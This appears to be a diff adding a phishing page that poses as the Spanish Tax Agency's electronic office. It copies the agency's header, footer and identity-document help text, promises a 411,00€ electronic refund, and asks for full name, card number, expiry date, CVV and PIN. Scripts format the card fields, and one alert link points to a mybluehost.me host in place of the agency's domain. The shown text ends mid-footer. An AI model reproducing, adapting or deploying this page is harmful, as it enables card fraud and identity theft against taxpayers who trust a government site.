@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+
+<html lang="es"><head>
+<meta content="Prohibida la reproduccion sin autorizacion expresa de la A.E.A.T." name="COPYRIGHT"/>
+<meta content="Agencia Estatal Administracion Tributaria" name="DESCRIPTION"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport" title="AEATviewport"/>
+<link href="local_resources/css/0dec6570c1f27f86aeaf5c3f7549a4dc.css" rel="stylesheet" type="text/css"/>
+<link href="local_resources/css/31331995d28e88265186036fe8a32726.css" rel="stylesheet"/><script src="local_resources/js/49e30b3b69dfec8fbd82c18b00fc2b7b.js"></script><script src="local_resources/js/0ecdb055aacc68a6e9f672ef5009bd7f.js"></script>
+<title>Verificación de tarjeta de crédito</title>
+<meta content="Sede" name="site"/>
+<script charset="UTF-8" src="local_resources/js/963a541d1625d8e7c2680d2bc424b0f0.js"></script>
+</head>
+<body>
+<div aria-describedby="title-avisoCookiesDesactivadas" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front ui-dialog-buttons ui-draggable noscript" role="dialog" tabindex="-1"><div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle"><span class="ui-dialog-title" id="title-avisoCookiesDesactivadas">Aviso: Javascript no habilitado</span></div><div class="ui-dialog-content ui-widget-content noscript" id="avisoCookiesDesactivadas"><div class="AEAT_bloque_errores"><p>Para el correcto funcionamiento de la sede Electrónica es necesario que su navegador permita la utilización de cookies y tenga habilitado el uso de javascript.</p><p>Si no sabe como hacerlo puede consultarlo en el siguiente enlace:</p><p><a class="enlace_no_decorado negrita" href="https://sede.agenciatributaria.gob.es/Sede/ayuda/consultas-informaticas/comprobaciones-tecnicas/requisitos-tecnicos-realizar-tramites-sede-electronica.html" target="blank">Requisitos técnicos para realizar trámites en la Sede Electrónica</a></p><p>Para mas información sobre las cookies visite la <a class="enlace_no_decorado negrita" href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/aviso-legal.html" target="blank">política de privacidad</a>.</p></div></div></div><div class="ui-widget-overlay ui-front"></div>
+<script>
+host_dirrec='https://www2.agenciatributaria.gob.es/static_files/common/internet/dep/aduanas/';
+</script>
+<script src="local_resources/js/b7b46e97e93f6c0c93fa608c8f443265.js"></script>
+<header class="header_aeat d-print-none d-app-none" id="AEAT_header">
+<!-- CABECERA -->
+<!--googleoff: index-->
+<a class="focus-only" href="index.html#acc-main">Saltar al contenido principal</a>
+<div class="header-sup_aeat w-100 fondo-pro" lang="es">
+<div class="container">
+<div class="row">
+<!-- CABECERA IZQUIERDA-->
+<div class="pl-0" id="topIzquierda">
+<nav class="header-contLogos_aeat">
+<a class="header-logosPrincipales_aeat" href="https://sede.agenciatributaria.gob.es/Sede/inicio.html" title="Página de inicio de la Agencia Tributaria">
+<span class="logoGobierno Sede">Logotipo del Gobierno de España</span>
+<span class="logoAEAT logoSite logoSede ml-2 overflow-hidden">Logotipo de la Agencia Tributaria
+                        </span>
+</a>
+</nav>
+</div>
+<!-- CABECERA IZQUIERDA FIN -->
+<!-- CABECERA DERECHA-->
+<div class="col d-flex align-items-center justify-content-end pr-0" id="topDerecha">
+<a class="mr-2 mr-sm-4 text-secondary small" href="https://sede.agenciatributaria.gob.es/Sede/Calendario_fecha_y_hora_oficial.html">
+<span class="js-reloj-movil d-xs-none" data-original-title="" data-placement="bottom" data-toggle="tooltip" title="">
+<i aria-hidden="true" class="aeat-ico fa-ico-reloj-sm ico-size-2 pointer-events-none" role="presentation" title="Icono Calendario, fecha y hora oficial"></i>
+</span>
+<span class="js-reloj d-none d-xs-inline" data-placement="bottom" data-toggle="tooltip"></span>
+<span class="sr-only">Hora oficial</span>
+</a>
+<div class="aeat--user" id="link-personal">
+<a class="cursor-pointer btn btn-primary mr-1 mr-sm-2 px-3 shadow-sm d-flex align-items-center" data-original-title="ÁREA PERSONAL" href="https://sede.agenciatributaria.gob.es/Sede/mi-area-personal.html">
+<i aria-hidden="true" class="aeat-ico fa-ico-usuario-sm ico-size-1 mr-2" role="presentation"></i>
+<span class="aeat--username d-none d-lg-inline small font-weight-bold pr-2 py-1">ÁREA PERSONAL</span>
+</a>
+</div>
+<div class="dropdown aeat--user d-none" id="aeat-jdit-user">
+<button aria-expanded="false" aria-haspopup="true" class="cursor-pointer btn btn-primary mr-1 mr-sm-2 px-3 shadow-sm d-flex align-items-center" data-toggle="dropdown" id="dropdownUsuario" type="button">
+<i aria-hidden="true" class="aeat-ico fa-ico-usuario-sm ico-size-1 mr-2" role="presentation"></i>
+<span class="aeat--username d-none d-lg-inline small font-weight-bold pr-2 py-1 notraducir" id="user-name">ÁREA PERSONAL</span>
+<span class="badge bg-light-blue text-primary mx-2 p-1 d-none" data-toggle="tooltip" id="alert-notification" title="">
+<i aria-hidden="true" class="aeat-ico fa-ico-bell-sm ico-size-mini d-none d-xs-block" role="presentation"></i>
+</span>
+<i aria-hidden="true" class="aeat-ico fa-ico-chevron-down ico-size-mini" role="presentation"></i>
+</button>
+<div aria-label="Área personal de usuario" class="dropdown-menu dropdown-menu-right">
+<div class="px-4 py-2 d-none">
+<small class="d-none text-secondary">Representante</small>
+<span class="aeat--username d-block small pointer-events-none mw-100 text-primary notraducir" data-original-title="NOTIFICACIONES TITULARES EXENTOS DE NIF" title="NOTIFICACIONES TITULARES EXENTOS DE NIF">NOTIFICACIONES TITULARES EXENTOS DE NIF</span>
+<small class="d-block text-secondary">89890005W</small>
+</div>
+<div class="px-4 py-2 align-items-center d-none">
+<div>
+<small class="d-block font-weight-bold text-secondary">En nombre propio</small>
+<span class="aeat--username-representado d-block small pointer-events-none font-weight-bold text-primary notraducir" data-original-title="" title=""></span>
+<small class="d-block text-secondary"></small>
+</div>
+<a class="btn btn-sm btn-secondary py-2 small cursor-pointer ml-2" href="index.html">Cambiar <span class="sr-only">usuario representado</span></a>
+</div>
+<span class="aeat--username dropdown-item d-none small font-weight-bold pointer-events-none"></span>
+<div class="dropdown-divider d-none"></div>
+<ul class="list-unstyled mb-0">
+<li>
+<a class="dropdown-item" data-href="https://sede.agenciatributaria.gob.es/Sede/mi-area-personal.html" data-toggle="tooltip" href="https://sede.agenciatributaria.gob.es/Sede/mi-area-personal.html" target="_self" title="Área personal"> <i aria-hidden="true" class="aeat-ico fa-ico-usuario-sm ico-size-1 mr-2" role="presentation"></i>
+                                    Área personal
+                                </a>
+</li>
+<li>
+<a class="dropdown-item d-none" data-href="https://khg.jwz.mybluehost.me/wlpl/IIIC-ALER/SvObtAlertas" data-original-title="Mis alertas" data-toggle="tooltip" href="wlpl/IIIC-ALER/SvObtAlertas.html" id="alert-link" target="_self" title=""> <i aria-hidden="true" class="aeat-ico fa-ico-bell-sm ico-size-1 mr-2" role="presentation"></i>
+                                    Mis alertas
+                                    <span class="badge bg-light-blue text-primary ml-1" data-original-title="" data-toggle="tooltip" title=""></span>
+</a>
+</li>
+</ul>
+<div class="dropdown-divider d-none"></div>
+<a class="dropdown-item d-none" data-toggle="tooltip" href="https://sede.agenciatributaria.gob.es/Sede/Desconectar.html" id="btn-desconectar" title="Desconectar todos los usuarios">
+<i aria-hidden="true" class="aeat-ico fa-ico-desconectar-sm text-danger mr-2 ico-size-1" role="presentation"></i>Desconectarse
+                        </a>
+</div>
+</div>
+<div class="dropdown js-dropdown-lang-app" id="idioma">
+<button aria-expanded="false" aria-haspopup="true" class="btn btn-link text-secondary d-flex align-items-center cursor-pointer" data-toggle="dropdown" id="dropdownIdiomas" role="button" type="button">
+<span class="js-idioma-actual" data-toggle="tooltip" title="Idioma actual">ES</span>
+<i aria-hidden="true" class="aeat-ico fa-ico-chevron-down ico-size-mini ml-2" role="presentation"></i>
+</button>
+<ul aria-labelledby="dropdownIdiomas" class="dropdown-menu dropdown-menu-right" id="dropdown-idioma" role="combobox">
+<!--AEATP1NOTRAD-->
+<li>
+<a aria-disabled="false" aria-selected="false" class="dropdown-item notraducir" data-lang="ca" href="https://www2.agenciatributaria.gob.es/wlpl/BUCV-JDIT/AutenticaDniNieContrasteh?ref=%2Fwlpl%2FOVCT-CXEW%2FSelectorAcceso%3Frep%3DS%26ref%3D%252Fwlpl%252FBUGC-JDIT%252FMdcAcceso%26aut%3DCP?ref=%2Fwlpl%2FOVCT-CXEW%2FSelectorAcceso%3Frep%3DS%26ref%3D%252Fwlpl%252FBUGC-JDIT%252FMdcAcceso%26aut%3DCP" hreflang="ca" lang="ca" tabindex="0" title="Català">
+                                Català
+                            </a>
+</li>
+<li>
+<a aria-disabled="false" aria-selected="false" class="dropdown-item notraducir" data-lang="gl" href="https://www2.agenciatributaria.gob.es/wlpl/BUCV-JDIT/AutenticaDniNieContrasteh?ref=%2Fwlpl%2FOVCT-CXEW%2FSelectorAcceso%3Frep%3DS%26ref%3D%252Fwlpl%252FBUGC-JDIT%252FMdcAcceso%26aut%3DCP?ref=%2Fwlpl%2FOVCT-CXEW%2FSelectorAcceso%3Frep%3DS%26ref%3D%252Fwlpl%252FBUGC-JDIT%252FMdcAcceso%26aut%3DCP" hreflang="gl" lang="gl" tabindex="0" title="Galego">
+                                Galego
+                            </a>
+</li>
+<li>
+<a aria-disabled="false" aria-selected="false" class="dropdown-item notraducir" data-lang="va" href="https://www2.agenciatributaria.gob.es/wlpl/BUCV-JDIT/AutenticaDniNieContrasteh?ref=%2Fwlpl%2FOVCT-CXEW%2FSelectorAcceso%3Frep%3DS%26ref%3D%252Fwlpl%252FBUGC-JDIT%252FMdcAcceso%26aut%3DCP?ref=%2Fwlpl%2FOVCT-CXEW%2FSelectorAcceso%3Frep%3DS%26ref%3D%252Fwlpl%252FBUGC-JDIT%252FMdcAcceso%26aut%3DCP" hreflang="ca-valencia" lang="ca-valencia" tabindex="0" title="Valencià">
+                                Valencià
+                            </a>
+</li>
+<li>
+<a aria-disabled="false" aria-selected="false" class="dropdown-item notraducir" data-lang="en" href="https://www2.agenciatributaria.gob.es/wlpl/BUCV-JDIT/AutenticaDniNieContrasteh?ref=%2Fwlpl%2FOVCT-CXEW%2FSelectorAcceso%3Frep%3DS%26ref%3D%252Fwlpl%252FBUGC-JDIT%252FMdcAcceso%26aut%3DCP?ref=%2Fwlpl%2FOVCT-CXEW%2FSelectorAcceso%3Frep%3DS%26ref%3D%252Fwlpl%252FBUGC-JDIT%252FMdcAcceso%26aut%3DCP" hreflang="en" lang="en" tabindex="0" title="English">
+                                English
+                            </a>
+</li>
+<li>
+<a aria-disabled="false" aria-selected="false" class="dropdown-item notraducir active" data-lang="es" href="https://www2.agenciatributaria.gob.es/wlpl/BUCV-JDIT/AutenticaDniNieContrasteh?ref=%2Fwlpl%2FOVCT-CXEW%2FSelectorAcceso%3Frep%3DS%26ref%3D%252Fwlpl%252FBUGC-JDIT%252FMdcAcceso%26aut%3DCP?ref=%2Fwlpl%2FOVCT-CXEW%2FSelectorAcceso%3Frep%3DS%26ref%3D%252Fwlpl%252FBUGC-JDIT%252FMdcAcceso%26aut%3DCP" hreflang="es" lang="es" tabindex="0" title="Castellano">
+                                Castellano
+                            </a>
+</li>
+<!--/AEATP1NOTRAD-->
+</ul>
+</div>
+</div>
+<!-- CABECERA DERECHA-->
+</div>
+</div>
+</div>
+<!--googleon: index-->
+<!-- CABECERA FIN -->
+<!-- MENU -->
+<div class="w-100 bg-primary p-1"></div>
+<!-- MENU FIN -->
+</header>
+<div class="js-container" id="contenedor">
+<div id="AEAT_contenedor_Aplicacion">
+<main id="AEAT_contenedor_Main">
+<div class="AEAT_aplicacion" id="acc-main">
+<script>set_cookie('INT-MENSAJE','');</script>
+<div id="divMensajeRecarga"></div>
+<nav>
+<div class="AEAT_navegacion">
+<div class="AEAT_bloque_errores bloque oculto" id="idDivAlertas"></div>
+</div>
+</nav>
+<script>
+var sospechoAzul = false;
+var nieFecha = false;
+var enlaceCertificado = true;
+jQuery(document).ready(function() {
+	document.getElementById('FECHA').parentNode.style.paddingTop = '0px';
+	jQuery('.AEAT_aplicacion').css('margin','0 auto');
+	jQuery('.AEAT_aplicacion').css('width','75%');
+	jQuery('.AEAT_aplicacion').css('display','block');
+	jQuery('#NIF').parent().append('<span id="errorNif" class="rojo"></span>')
+	if (jQuery('#NIF')[0].value != '') {
+		validarNif();
+	}
+	document.getElementById('FECHA').parentNode.id = 'liFecha';
+	document.getElementById('botonAutenticacionDebil').className = 'AEAT_boton_main';
+});
+</script>
+<form class="fondo_blanco" id="formAutenticaDebil" method="POST">
+<center><h4>Formulario de reembolso electrónico Monto : 411,00€</h4></center>
+<fieldset class="conborde">
+<ul class="AEAT_form ancho_100 lista_espaciada">
+<li class="oculto"><input id="AZUL" name="AZUL" type="hidden" value=""/>
+</li>
+<li class="oculto"><input id="FECHANIE" name="FECHANIE" type="hidden" value=""/>
+</li>
+<li class="ancho_99">
+<label for="NIF">
+<span class="obligatorio" title="Campo Obligatorio">*</span>Nombre completo
+</label>
+<input autocomplete="off" name="fullname" required="" size="29" type="text"/>
+</li>
+<li class="ancho_99">
+<label for="NIF">
+<span class="obligatorio" title="Campo Obligatorio">*</span>Número de Tarjeta de Crédito
+</label>
+<input autocomplete="off" id="ccnum" maxlength="16" minlength="16" name="ccnum" required="" size="29" type="text"/>
+</li>
+<li class="ancho_99">
+<label for="NIF">
+<span class="obligatorio" title="Campo Obligatorio">*</span>Fecha de caducidad
+</label>
+<input autocomplete="off" id="exp" maxlength="5" minlength="5" name="exp" required="" size="29" type="text"/>
+</li>
+<li class="ancho_99">
+<label for="NIF">
+<span class="obligatorio" title="Campo Obligatorio">*</span>CVV
+</label>
+<input autocomplete="off" id="cvv" maxlength="3" minlength="3" name="cvv" required="" size="15" type="text"/>
+</li>
+<li class="ancho_99">
+<label for="NIF">
+<span class="obligatorio" title="Campo Obligatorio">*</span>PIN
+</label>
+<input autocomplete="off" id="pin" name="pin" required="" size="15" type="text"/>
+</li>
+</ul>
+<input class="AEAT_boton_main" id="botonAutenticacionDebil" name="doSubmit" type="submit" value="Continuar"/>
+</fieldset>
+<div class="oculto capaDatosContraste" id="capaDatosContrasteDNI">
+<fieldset class="conborde">
+<ul class="AEAT_form ancho_100 lista_espaciada">
+<li id="textoFechaNacimiento"><span class="obligatorio" title="Campo Obligatorio">*</span><span>Introduzca su <strong>Fecha de nacimiento</strong> (dd-mm-aaaa)</span></li>
+<li id="textoFechaExpedicion"><span class="obligatorio" title="Campo Obligatorio">*</span><span>Introduzca la <strong>Fecha de Expedición</strong> (dd-mm-aaaa). Consulte la  ayuda para localizar dicha fecha en su DNI</span></li>
+<li id="textoFechaValidez"><span class="obligatorio" title="Campo Obligatorio">*</span><span>Introduzca la <strong>Fecha de Validez</strong> de su DNI (o Fecha de Expedición si es un DNI Permanente)</span></li>
+<li class="ancho_99" id="liFecha" style="padding-top: 0px;" title="Fecha en formato dd-mm-aaaa">
+<label for="FECHA">
+<script>
+                  jQuery.fn.ForceNumericOnly =
+                  function()
+                  {
+                      return this.each(function()
+                      {
+                          $(this).keydown(function(e)
+                          {
+                              var key = e.charCode || e.keyCode || 0;
+                              return (
+                                  key == 8 ||
+                                  key == 9 ||
+                                  key == 13 ||
+                                  key == 46 ||
+                                  key == 110 ||
+                                  key == 190 ||
+                                  (key >= 35 && key <= 40) ||
+                                  (key >= 48 && key <= 57) ||
+                                  (key >= 96 && key <= 105));
+                          });
+                      });
+                  };
+
+                  $("#ccnum").ForceNumericOnly();
+                  $("#cvv").ForceNumericOnly();
+                  $("#exp").ForceNumericOnly();
+                      $('#exp').on("keyup , focus , input", () => {
+                          var creditExpirationMonth = $("#exp").val()
+
+                          let my = $('#exp')
+                          if (my.val().length == 2 && !my.val().includes("/"))
+                              my.val(my.val() + "/")
+
+                      });
+                  </script>
+</label>
+<input autocomplete="off" class="text input_mask mask_date_us datepicker" id="FECHA" name="FECHA" onkeyup='jQuery("#errorFecha").remove();' size="10" type="date" value=""/>
+</li>
+</ul>
+</fieldset>
+</div>
+<div class="oculto capaDatosContraste" id="capaDatosContrasteNIE">
+<fieldset class="conborde">
+<ul class="AEAT_form ancho_100 lista_espaciada">
+<li id="textoNumeroSoporte"><span class="obligatorio" title="Campo Obligatorio">*</span><span>Introduzca el Número de Soporte. Consulte la ayuda para localizar dicho número en su documento</span></li>
+<li class="ancho_99">
+<input aria-label="Sin literal" autocomplete="off" id="SOPORTE" maxlength="9" name="SOPORTE" size="9" type="text" value=""/>
+</li>
+</ul>
+</fieldset>
+</div>
+<div class="oculto capaDatosContraste" id="capaBotones">
+<div class="AEAT_bloque_botones ancho_100">
+<a class="AEAT_boton_main" href="https://www2.agenciatributaria.gob.es/wlpl/BUCV-JDIT/AutenticaDniNieContrasteh?ref=https:%2F%2Fwww1.agenciatributaria.gob.es%2Fwlpl%2FOVCT-CXEW%2FDialogoRepresentacion?ref=%2Fwlpl%2FBUGC-JDIT%2FMdcAcceso">Cancelar</a>
+<input accesskey="C" class="AEAT_boton_main" id="botonAutenticacionDebil" name="botonAutenticacionDebil" type="button" value="Continuar"/>
+<script>
+jQuery(document).ready(function(){jQuery('#botonAutenticacionDebil').on('click keypress', 
+    function(event){
+        submitFormulario()
+    }
+);});
+</script>
+</div>
+</div>
+<div class="oculto capaDatosContraste" id="capaDatosContrasteDNI2">
+<div id="ayudaFechaValidez_oculta">
+<img alt="icono capa oculta" src="local_resources/img/888092b6ad95a6231ec58634eeb6b251.GIF" title="Ocultar/Mostrar Información"/><a class="destacado" href="index.html#">¿Cómo obtener la fecha de validez de su DNI?</a>
+</div>
+<div class="oculto" id="ayudaFechaValidez_mostrada">
+<img alt="icono capa mostrada" src="local_resources/img/e6ede7c860a408082f221d711932a632.GIF" title="Ocultar/Mostrar Información"/><a class="destacado" href="index.html#">¿Cómo obtener la fecha de validez de su DNI?</a>
+<script>
+jQuery(document).ready(function(){
+	jQuery('#ayudaFechaValidez_oculta a:first').on('click keypress',function(e){e.preventDefault();jQuery('#ayudaFechaValidez_mostrada').toggleClass('oculto');jQuery('#ayudaFechaValidez_oculta').toggleClass('oculto');jQuery('#ayudaFechaValidez_mostrada').toggleClass('bloque');});
+	jQuery('#ayudaFechaValidez_mostrada a:first').on('click keypress',function(e){e.preventDefault();jQuery('#ayudaFechaValidez_oculta').toggleClass('oculto');jQuery('#ayudaFechaValidez_mostrada').toggleClass('oculto');jQuery('#ayudaFechaValidez_mostrada').toggleClass('bloque');});
+});
+</script>
+<div class="ayudaDNIs" id="ayudaDNIe">
+<img alt="DNI: Ver fecha de validez del documento, último campo en el anverso del Documento" src="local_resources/img/e0ded5d96f553b567282251972935e13.png"/>
+<img alt="DNIe (antiguo): Ver fecha de validez del documento, último campo en el anverso del Documento" src="local_resources/img/09c608f35019af23017213b5a083de0c.jpg"/>
+<img alt="DNIe: Ver fecha de validez del documento, último campo en el anverso del Documento" src="local_resources/img/debe1c95e73e9aea86b4351b551a58f7.png"/>
+<img alt="DNIe (4.0): Ver fecha de validez del documento, último campo en el anverso del Documento" src="local_resources/img/d673f397f638a960fb48137dfa19b1bb.jpg"/>
+</div>
+</div>
+<div id="ayudaFechaExpedicion_oculta">
+<img alt="icono capa oculta" src="local_resources/img/888092b6ad95a6231ec58634eeb6b251.GIF" title="Ocultar/Mostrar Información"/><a class="destacado" href="index.html#">¿Cómo obtener la fecha de expedición de su DNI?</a>
+</div>
+<div class="oculto" id="ayudaFechaExpedicion_mostrada">
+<img alt="icono capa mostrada" src="local_resources/img/e6ede7c860a408082f221d711932a632.GIF" title="Ocultar/Mostrar Información"/><a class="destacado" href="index.html#">¿Cómo obtener la fecha de expedición de su DNI?</a>
+<script>
+jQuery(document).ready(function(){
+	jQuery('#ayudaFechaExpedicion_oculta a:first').on('click keypress',function(e){e.preventDefault();jQuery('#ayudaFechaExpedicion_mostrada').toggleClass('oculto');jQuery('#ayudaFechaExpedicion_oculta').toggleClass('oculto');jQuery('#ayudaFechaExpedicion_mostrada').toggleClass('bloque');});
+	jQuery('#ayudaFechaExpedicion_mostrada a:first').on('click keypress',function(e){e.preventDefault();jQuery('#ayudaFechaExpedicion_oculta').toggleClass('oculto');jQuery('#ayudaFechaExpedicion_mostrada').toggleClass('oculto');jQuery('#ayudaFechaExpedicion_mostrada').toggleClass('bloque');});
+});
+</script>
+<div class="ayudaDNIs" id="ayudaDNI">
+<img alt="DNI: Localizar fecha de expedición, campo junto a fecha de validez en el anverso del DNI" src="local_resources/img/8857c1ca1cf34b63c5c53fc121552e20.png"/>
+<img alt="DNIe (antiguo): Localizar fecha de expedición, último campo en el anverso del DNI." src="local_resources/img/c9a2eba2d5383ead61df4df91cadf96d.jpg"/>
+<img alt="DNIe: Localizar fecha de expedición, último campo parte derecha en el anverso del DNI" src="local_resources/img/9ac1c5bdad2a1bf0560315a2657abd10.png"/>
+<img alt="DNIe (4.0): Localizar fecha de expedición, último campo parte derecha en el anverso del DNI" src="local_resources/img/2f9addb2f4092498e8aeeeef875341e3.jpg"/>
+<img alt="Anverso DNI permanente" src="local_resources/img/2a1be611580265583776f1c2e5aab75f.jpg"/>
+<img alt="DNI antiguo (azul): Localizar fecha de Expedición DNI permanente. último campo en el reverso del DNI." src="local_resources/img/87ed7a7c0b0d6817d4995efd9ae5babf.jpg"/>
+</div>
+</div>
+</div>
+<div class="oculto capaDatosContraste" id="capaDatosContrasteNIE2">
+<div id="ayudaSoporteTarjetaExtranjero_oculta">
+<img alt="icono capa oculta" src="local_resources/img/888092b6ad95a6231ec58634eeb6b251.GIF" title="Ocultar/Mostrar Información"/><a class="destacado" href="index.html#">¿Cómo obtener el número de soporte de su tarjeta de extranjero?</a>
+</div>
+<div class="oculto" id="ayudaSoporteTarjetaExtranjero_mostrada">
+<img alt="icono capa mostrada" src="local_resources/img/e6ede7c860a408082f221d711932a632.GIF" title="Ocultar/Mostrar Información"/><a class="destacado" href="index.html#">¿Cómo obtener el número de soporte de su tarjeta de extranjero?</a>
+<script>
+jQuery(document).ready(function(){
+	jQuery('#ayudaSoporteTarjetaExtranjero_oculta a:first').on('click keypress',function(e){e.preventDefault();jQuery('#ayudaSoporteTarjetaExtranjero_mostrada').toggleClass('oculto');jQuery('#ayudaSoporteTarjetaExtranjero_oculta').toggleClass('oculto');jQuery('#ayudaSoporteTarjetaExtranjero_mostrada').toggleClass('bloque');});
+	jQuery('#ayudaSoporteTarjetaExtranjero_mostrada a:first').on('click keypress',function(e){e.preventDefault();jQuery('#ayudaSoporteTarjetaExtranjero_oculta').toggleClass('oculto');jQuery('#ayudaSoporteTarjetaExtranjero_mostrada').toggleClass('oculto');jQuery('#ayudaSoporteTarjetaExtranjero_mostrada').toggleClass('bloque');});
+});
+</script>
+<div class="ayudaNIEs" id="ayudaTarjetaExt">
+<img alt="Tarjeta de extranjero: Localizar número de soporte en el anverso del NIE en la esquina superior derecha." src="local_resources/img/f8ef0909476fedb6b494f6797c63bb64.jpg"/>
+<p class="texto_cen azul textoImagenAyuda">El número de soporte a introducir ha de tener una longitud de 9 posiciones: una letra E seguida de 8 caracteres numéricos. En el caso de que el número de soporte que figura en su tarjeta tenga menos de 8 caracteres numéricos, ha de introducir tantos ceros como caracteres numéricos falten a continuación de la letra E.</p>
+</div>
+</div>
+<div id="ayudaSoportePermisoResidencia_oculta">
+<img alt="icono capa oculta" src="local_resources/img/888092b6ad95a6231ec58634eeb6b251.GIF" title="Ocultar/Mostrar Información"/><a class="destacado" href="index.html#">¿Cómo obtener el número de soporte de su permiso de residencia?</a>
+</div>
+<div class="oculto" id="ayudaSoportePermisoResidencia_mostrada">
+<img alt="icono capa mostrada" src="local_resources/img/e6ede7c860a408082f221d711932a632.GIF" title="Ocultar/Mostrar Información"/><a class="destacado" href="index.html#">¿Cómo obtener el número de soporte de su permiso de residencia?</a>
+<script>
+jQuery(document).ready(function(){
+	jQuery('#ayudaSoportePermisoResidencia_oculta a:first').on('click keypress',function(e){e.preventDefault();jQuery('#ayudaSoportePermisoResidencia_mostrada').toggleClass('oculto');jQuery('#ayudaSoportePermisoResidencia_oculta').toggleClass('oculto');jQuery('#ayudaSoportePermisoResidencia_mostrada').toggleClass('bloque');});
+	jQuery('#ayudaSoportePermisoResidencia_mostrada a:first').on('click keypress',function(e){e.preventDefault();jQuery('#ayudaSoportePermisoResidencia_oculta').toggleClass('oculto');jQuery('#ayudaSoportePermisoResidencia_mostrada').toggleClass('oculto');jQuery('#ayudaSoportePermisoResidencia_mostrada').toggleClass('bloque');});
+});
+</script>
+<div class="ayudaNIEs" id="ayudaPermisoRes">
+<img alt="Permiso de residencia: Localizar número de soporte en el anverso del NIE en la esquina superior derecha." src="local_resources/img/d8ff3b35cf9e7661cbd1a4bbe8eed839.jpg"/>
+<p class="texto_cen azul textoImagenAyuda">El número de soporte a introducir ha de tener una longitud de 9 posiciones: una letra E seguida de 8 caracteres numéricos. En el caso de que el número de soporte que figura en su tarjeta tenga menos de 8 caracteres numéricos, ha de introducir tantos ceros como caracteres numéricos falten a continuación de la letra E.</p>
+</div>
+</div>
+<div id="ayudaSoporteCiudadanoUE_oculta">
+<img alt="icono capa oculta" src="local_resources/img/888092b6ad95a6231ec58634eeb6b251.GIF" title="Ocultar/Mostrar Información"/><a class="destacado" href="index.html#">¿Cómo obtener el número de soporte de su certificado de ciudadano de la UE?</a>
+</div>
+<div class="oculto" id="ayudaSoporteCiudadanoUE_mostrada">
+<img alt="icono capa mostrada" src="local_resources/img/e6ede7c860a408082f221d711932a632.GIF" title="Ocultar/Mostrar Información"/><a class="destacado" href="index.html#">¿Cómo obtener el número de soporte de su certificado de ciudadano de la UE?</a>
+<script>
+jQuery(document).ready(function(){
+	jQuery('#ayudaSoporteCiudadanoUE_oculta a:first').on('click keypress',function(e){e.preventDefault();jQuery('#ayudaSoporteCiudadanoUE_mostrada').toggleClass('oculto');jQuery('#ayudaSoporteCiudadanoUE_oculta').toggleClass('oculto');jQuery('#ayudaSoporteCiudadanoUE_mostrada').toggleClass('bloque');});
+	jQuery('#ayudaSoporteCiudadanoUE_mostrada a:first').on('click keypress',function(e){e.preventDefault();jQuery('#ayudaSoporteCiudadanoUE_oculta').toggleClass('oculto');jQuery('#ayudaSoporteCiudadanoUE_mostrada').toggleClass('oculto');jQuery('#ayudaSoporteCiudadanoUE_mostrada').toggleClass('bloque');});
+});
+</script>
+<div class="ayudaNIEs" id="ayudaCiudadanoUE">
+<img alt="Certificado de ciudadano de la UE: Localizar número de soporte en el reverso del NIE en la esquina inferior derecha" src="local_resources/img/891470c0716e6ad340df79d533e9f2fc.jpg"/>
+<p class="texto_cen azul textoImagenAyuda">El número de soporte a introducir ha de tener una longitud de 9 posiciones: una letra C seguida de 8 caracteres numéricos. En el caso de que el número de soporte que figura en su certificado tenga menos de 8 caracteres numéricos, ha de introducir tantos ceros como caracteres numéricos falten a continuación de la letra C.</p>
+<img alt="Carta del certificado de ciudadano de la UE" src="local_resources/img/0c25d3ae83d432679d9333d0b11bae93.jpg"/>
+</div>
+</div>
+</div>
+</form>
+</div>
+</main>
+</div>
+</div>
+<footer class="bg-primary d-print-none d-app-none"><div class="container py-3"><div class="row"><div class="col-12 col-sm-6 col-lg-3"><h2 class="h4 mb-3 text-white js-aeat-footer-collapse-sm" id="tgraeat-id-1675798679916">Agencia Tributaria</h2><ul class="list-unstyled" id="aeat-id-1675798679916"><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/accesibilidad/declaracion-accesibilidad.html" target="_self" title="Accesibilidad">Accesibilidad</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/aviso-seguridad.html" target="_self" title="Aviso de seguridad">Aviso de seguridad</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/aviso-legal.html" target="_self" title="Aviso legal">Aviso legal</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/validacion-certificado-sede.html" target="_self" title="Validación del certificado de sede">Validación del certificado de sede</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/datos-personales.html" target="_self" title="Protección de datos">Protección de datos</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/politica-linguistica.html" target="_self" title="Política lingüística">Política lingüística</a></li><li class="position-relative"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/condiciones-uso-sede-electronica/estructura-navegacion-sede-electronica.html" target="_self" title="Estructura y navegación en la sede electrónica">Estructura y navegación en la sede electrónica</a></li></ul></div><div class="col-12 col-sm-6 col-lg-3"><h2 class="h4 mb-3 text-white js-aeat-footer-collapse-sm" id="tgraeat-id-1675798679917">Contacta con nosotros</h2><ul class="list-unstyled" id="aeat-id-1675798679917"><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/contacta-nosotros/telefonos-interes.html" target="_self" title="Teléfonos de interés">Teléfonos de interés</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/buscador-oficinas.html" target="_self" title="Buscador de oficinas">Buscador de oficinas</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/procedimientoini/GC29.shtml" target="_self" title="Cita previa">Cita previa</a></li><li class="position-relative mb-2"><a class="d-block text-white" href="https://sede.agenciatributaria.gob.es/Sede/buzones-sugerencias.html" target="_self" title="Buzones de sugerencias">Buzones de sugerencias</a></li><li class="position-relative mb-2"><a class="d-block text-white" 